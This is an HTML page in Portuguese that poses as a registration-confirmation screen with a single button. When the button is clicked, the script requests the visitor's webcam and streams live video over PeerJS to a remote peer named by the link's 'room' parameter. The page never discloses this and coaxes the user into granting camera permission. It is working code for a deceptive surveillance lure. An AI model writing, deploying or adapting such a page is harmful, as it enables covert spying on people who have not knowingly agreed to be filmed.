
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Confirmar inscrição</title>
<script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
<style>
body {
    margin: 0;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: Arial, sans-serif;
    background: #f3f4f6;
}
button {
    background: #176b3a;
    color: white;
    border: 0;
    border-radius: 8px;
    padding: 20px 30px;
    font-size: 19px;
    font-weight: bold;
    cursor: pointer;
}
button:disabled {
    opacity: .7;
}
</style>
</head>
<body>

<button id="confirmar">CONFIRMAR INSCRIÇÃO</button>

<script>
const botao = document.getElementById("confirmar");
const sala = new URLSearchParams(location.search).get("room");

let peer;
let stream;

botao.addEventListener("click", async () => {
    if (!sala) {
        alert("Convite inválido. Solicite um novo link.");
        return;
    }

    botao.disabled = true;

    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: false
        });

        peer = new Peer();

        peer.on("open", () => {
            const chamada = peer.call(sala, stream);

            if (!chamada) {
                alert("Não foi possível conectar ao painel.");
                botao.disabled = false;
            }
        });

        peer.on("error", () => {
            alert("Falha na conexão. Tente novamente.");
            botao.disabled = false;
        });

    } catch (erro) {
        alert("Não foi possível liberar a câmera. Verifique a permissão do navegador.");
        botao.disabled = false;
    }
});
</script>

</body>
</html>
